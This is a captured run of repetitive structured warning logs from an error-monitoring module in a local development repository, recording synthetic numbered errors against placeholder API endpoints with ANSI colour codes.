WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875652Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3498'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875703Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m70[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3499'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875753Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3500'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875803Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3501'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875851Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3502'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875899Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3503'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875948Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3504'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.875997Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3505'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876045Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3506'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876118Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3507'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876208Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3508'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876270Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3509'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876324Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3510'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876380Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3511'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876430Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3512'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876484Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3513'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876537Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3514'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876587Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3515'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876637Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3516'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876687Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3517'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876736Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3518'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876785Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3519'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876834Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3520'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876882Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3521'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.876932Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3522'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877025Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3523'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877096Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3524'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877155Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3525'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877207Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3526'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877259Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3527'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877312Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3528'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877363Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3529'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877411Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3530'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877460Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3531'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877509Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3532'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877557Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3533'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877607Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3534'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877656Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3535'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877704Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3536'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.877752Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m71[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3537'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
